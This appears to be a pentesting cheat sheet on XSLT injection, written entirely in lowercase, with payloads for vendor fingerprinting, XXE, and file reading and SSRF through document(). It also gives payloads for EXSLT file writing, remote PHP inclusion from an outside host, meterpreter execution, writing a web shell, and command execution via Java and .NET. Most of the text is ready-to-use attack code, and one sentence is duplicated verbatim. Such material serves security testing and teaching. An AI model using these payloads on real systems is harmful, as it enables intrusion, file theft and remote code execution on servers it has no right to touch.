# xslt injection

> processing an un-validated xsl stylesheet can allow an attacker to change the structure and contents of the resultant xml, include arbitrary files from the file system, or execute arbitrary code


## summary

- [tools](#tools)
- [methodology](#methodology)
    - [determine the vendor and version](#determine-the-vendor-and-version)
    - [external entity](#external-entity)
    - [read files and ssrf using document](#read-files-and-ssrf-using-document)
    - [write files with exslt extension](#write-files-with-exslt-extension)
    - [remote code execution with php wrapper](#remote-code-execution-with-php-wrapper)
    - [remote code execution with java](#remote-code-execution-with-java)
    - [remote code execution with native .net](#remote-code-execution-with-native-net)
- [labs](#labs)
- [references](#references)


## tools

no known tools currently exist to assist with xslt exploitation.


## methodology

### determine the vendor and version

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform">
  <xsl:template match="/fruits">
	<xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl">
<body>
<br />version: <xsl:value-of select="system-property('xsl:version')" />
<br />vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />vendor url: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

### external entity

don't forget to test for xxe when you encounter xslt files.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!doctype dtd_sample[<!entity ext_file system "c:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform">
  <xsl:template match="/fruits">
    fruits &ext_file;:
    <!-- loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

### read files and ssrf using document

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    fruits:
	    <!-- loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```


### write files with exslt extension

exslt, or extensible stylesheet language transformations, is a set of extensions to the xslt (extensible stylesheet language transformations) language. exslt, or extensible stylesheet language transformations, is a set of extensions to the xslt (extensible stylesheet language transformations) language. 

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/xsl/transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">
      hello world!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```


### remote code execution with php wrapper

execute the function `readfile`.

```xml
<?xml version="1.0" encoding="utf-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```

execute the function `scandir`.

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
  </xsl:template>
</xsl:stylesheet>
```

execute a remote php file using `assert`

```xml
<?xml version="1.0" encoding="utf-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl">
<body style="font-family:arial;font-size:12pt;background-color:#eeeeee">
  <xsl:variable name="payload">
    include("http://10.10.10.10/test.php")
  </xsl:variable>
  <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```

execute a php meterpreter using php wrapper.

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:variable name="eval">
      eval(base64_decode('base64-encoded meterpreter code'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
  </xsl:template>
</xsl:stylesheet>
```

execute a remote php file using `file_put_contents`

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_get[&quot;command&quot;]); ?&gt;')" />
  </xsl:template>
</xsl:stylesheet>
```

### remote code execution with java

```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getruntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processstring" select="ob:tostring($process)"/>
      <xsl:value-of select="$processstring"/>
    </xsl:template>
  </xsl:stylesheet>
```

```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="runtime:exec(runtime:getruntime(),'cmd.exe /c ping ip')" xmlns:runtime="java:java.lang.runtime"/>
</xsl:template>.
</xsl:stylesheet>
```

### remote code execution with native .net

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:app="http://www.tempuri.org/app">
    <msxsl:script implements-prefix="app" language="c#">
      <![cdata[
        public string toshortdatestring(string date)
          {
              system.diagnostics.process.start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="arrayoftest">
      <table>
        <xsl:for-each select="test">
          <tr>
          <td>
            <xsl:value-of select="app:toshortdatestring(testdate)" />
          </td>
          </tr>
        </xsl:for-each>
      </table>
    </xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "c#" implements-prefix = "user">
<![cdata[
public string execute(){
system.diagnostics.process proc = new system.diagnostics.process();
proc.startinfo.filename= "c:\\windows\\system32\\cmd.exe";
proc.startinfo.redirectstandardoutput = true;
proc.startinfo.useshellexecute = false;
proc.startinfo.arguments = "/c dir";
proc.start();
proc.waitforexit();
return proc.standardoutput.readtoend();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- begin command output ---
	<xsl:value-of select="user:execute()"/>
  --- end command output ---	
  </xsl:template>
</xsl:stylesheet>
```


## labs

- [root me - xslt - code execution](https://www.root-me.org/en/challenges/web-server/xslt-code-execution)


## references

- [from xslt code execution to meterpreter shells - nicolas grégoire (@agarri) - july 2, 2012](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
- [xslt injection - fortify - january 16, 2021](http://web.archive.org/web/20210116001237/https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
- [xslt injection basics - saxon - hunnic cyber team - august 21, 2019](http://web.archive.org/web/20190821174700/https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
- [getting xxe in web browsers using chatgpt - igor sak-sakovskiy - may 22, 2024](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
- [xslt injection lead to file creation - pt swarm (@ptswarm) - may 30, 2024](https://twitter.com/ptswarm/status/1796162911108255974/photo/1)